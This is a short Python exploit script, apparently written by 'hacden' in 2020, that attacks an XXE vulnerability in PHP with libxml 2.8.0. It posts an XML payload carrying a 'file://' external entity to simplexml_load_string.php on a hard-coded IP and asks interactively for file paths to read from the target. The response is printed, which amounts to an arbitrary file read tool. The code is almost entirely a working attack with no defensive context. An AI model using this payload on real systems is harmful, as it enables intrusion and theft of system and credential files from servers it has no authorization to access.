#!/usr/bin/env python3
#by hacden 2020/06/21
###################################libxml 2.8.0   PHP-XXE######################################
import requests



def check(url,read_file):

    payload = '<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE xxe [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "file://%s" >]><root><name>&xxe;</name></root>' % read_file

    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36",
        "Content-Type": "application/xml; charset=UTF-8"}
    try:
        url = url + "simplexml_load_string.php"
        resp = requests.post(url,data=payload,headers=headers)
        if "warning" in resp.text:
            pass
        else:
            print("-"*50)
            print(resp.text)
            # if "root:" in resp.text:
            #     msg = "[+] OK! There is PHP-XXE Vulnerable"
            #     return True, url, msg
            #
    except:
        msg = '[-] There is PHP Seems NOT XXE Vulnerable'
        return False, url, msg
def run(protol,ip,port):
    if port:
        url = protol + "://" + ip + ":" + port.strip() + '/'
    else:
        url = protol + "://" + ip + '/'
    while True:
        read_file = str(input("Please input [exit] Out or Read file on Tarket>$: ").strip())
        if read_file.strip() == "exit":
            exit(1)
        try:
            if (check(url,read_file)):
                return check(url,read_file)
        except:
            msg = '[-] There is PHP Seems NOT XXE Vulnerable'
            return False, url, msg

if __name__ == '__main__':
    ip = "       192.168.43.90  "
    print(run("http",ip.strip(),"    8080  "))